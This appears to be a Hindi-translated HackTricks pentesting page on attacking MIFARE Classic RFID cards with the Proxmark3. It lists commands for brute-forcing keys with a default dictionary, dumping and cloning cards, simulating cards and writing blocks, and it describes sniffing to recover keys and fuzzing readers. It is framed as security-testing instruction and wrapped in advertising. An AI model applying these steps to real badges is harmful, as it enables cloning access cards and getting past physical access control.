# Proxmark 3

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) या [**telegram group**](https://t.me/peass) में शामिल हों या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें और PRs सबमिट करें** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को**.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

विशेषताएं खोजें जो सबसे महत्वपूर्ण हैं ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपकी हमले की सतह का ट्रैक करता है, प्रोएक्टिव धमकी स्कैन चलाता है, आपकी पूरी टेक स्टैक, API से वेब ऐप्स और क्लाउड सिस्टम तक, मुद्दों को खोजता है। [**आज ही मुफ्त में इसे ट्राय करें**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Proxmark3 के साथ RFID सिस्टमों को हमला करना

सबसे पहली चीज जो आपको करनी होगी, वह है [**Proxmark3**](https://proxmark.com) और [**सॉफ़्टवेयर और इसकी आवश्यकताएं स्थापित करें**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### MIFARE Classic 1KB को हमला करना

इसमें **16 सेक्टर** होते हैं, प्रत्येक में **4 ब्लॉक** होते हैं और प्रत्येक ब्लॉक में **16B** होते हैं। UID सेक्टर 0 ब्लॉक 0 में होता है (और इसे बदला नहीं जा सकता है)।\
प्रत्येक सेक्टर तक पहुंचने के लिए आपको **2 कुंजी** (**A** और **B**) की आवश्यकता होती है जो प्रत्येक सेक्टर के **ब्लॉक 3 में संग्रहीत** होती हैं (सेक्टर ट्रेलर)। सेक्टर ट्रेलर में ही **एक्सेस बिट्स** भी संग्रहीत होते हैं जो 2 कुंजियों का उपयोग करके प्रत्येक ब्लॉक पर **पढ़ने और लिखने** की अनुमति देते हैं।\
यदि आप पहली कुंजी को जानते हैं तो पढ़ने की अनुमति देने के लिए 2 कुंजियों का उपयोग करना उपयोगी है और यदि आप दूसरी कुंजी को जानते हैं तो लिखने की अनुमति देने के लिए। (उदाहरण के लिए)।

कई हमले किए जा सकते हैं।
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3 के द्वारा अन्य कार्रवाई करने की अनुमति होती है, जैसे कि **टैग से रीडर संचार का अवरोधन** करके संवेदनशील डेटा खोजने का प्रयास करना। इस कार्ड में, आप संचार को स्निफ करके उपयोग किए गए कुंजी की गणना कर सकते हैं क्योंकि **क्रिप्टोग्राफिक प्रक्रियाएं कमजोर होती हैं** और सादा और चिपरण पाठ को जानते हुए आप इसे गणना कर सकते हैं (`mfkey64` टूल का उपयोग करके)।

### कच्चे आदेश

आईओटी सिस्टम कभी-कभी **ब्रांडेड या गैर-वाणिज्यिक टैग्स** का उपयोग करते हैं। इस मामले में, आप Proxmark3 का उपयोग करके टैग्स को कस्टम **कच्चे आदेश भेजने** के लिए कर सकते हैं।
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
इस जानकारी के साथ आप कार्ड के बारे में और उसके साथ संवाद करने के तरीके के बारे में जानकारी खोजने की कोशिश कर सकते हैं। Proxmark3 को ऐसे रॉ आदेश भेजने की अनुमति देता है जैसे: `hf 14a raw -p -b 7 26`

### स्क्रिप्ट

Proxmark3 सॉफ़्टवेयर के साथ एक पूर्व लोड की गई सूची है जिसमें आप सरल कार्यों को करने के लिए उपयोग कर सकते हैं। पूरी सूची प्राप्त करने के लिए, `script list` आदेश का उपयोग करें। अगले, स्क्रिप्ट के नाम के बाद `script run` आदेश का उपयोग करें:
```
proxmark3> script run mfkeys
```
आप एक स्क्रिप्ट बना सकते हैं ताकि आप **टैग रीडर** को **फज़ कर सकें**, इस प्रकार एक **मान्य कार्ड** के डेटा की प्रतिलिपि बनाएं और एक **लुआ स्क्रिप्ट** लिखें जो एक या एक से अधिक **रैंडम बाइट्स** को रैंडमाइज़ करता है और यह जांचता है कि क्या किसी भी आवृत्ति में **रीडर क्रैश** होता है।

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

जो सबसे महत्वपूर्ण हों उन खुदरा को खोजें ताकि आप उन्हें तेजी से ठीक कर सकें। इंट्रूडर आपकी हमला पट्टी का पता लगाता है, प्रोएक्टिव धारणा स्कैन चलाता है, आपकी पूरी टेक स्टैक, एपीआई से वेब ऐप्स और क्लाउड सिस्टम तक, मुद्दों को खोजता है। [**इसे नि: शुल्क परीक्षण के लिए प्रयास करें**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) आज ही।

{% embed url="https://www.intruder.io/?utm\_campaign=hacktricks&utm\_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की अनुमति चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)।

</details>
